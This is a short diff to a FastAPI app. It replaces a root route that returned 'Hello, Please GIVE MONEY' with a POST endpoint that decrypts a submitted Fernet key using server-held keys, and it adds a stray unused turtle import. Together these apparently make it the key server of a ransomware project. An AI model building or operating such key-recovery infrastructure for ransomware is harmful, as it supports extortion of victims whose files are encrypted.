@@ -1,4 +1,5 @@
-from fastapi import FastAPI
+from turtle import back
+from fastapi import FastAPI, Request
 import backend
 
 app = FastAPI()
@@ -6,6 +7,7 @@ app = FastAPI()
 # backend.generate_keys()
 backend.read_keys()
 
-@app.get("/")
-def read_root():
-    return 'Hello, Please GIVE MONEY'
+@app.post("/")
+async def decript_fernet_key(request: Request):
+    key: bytes = await request.body()
+    return backend.decript_fernet_key(key)
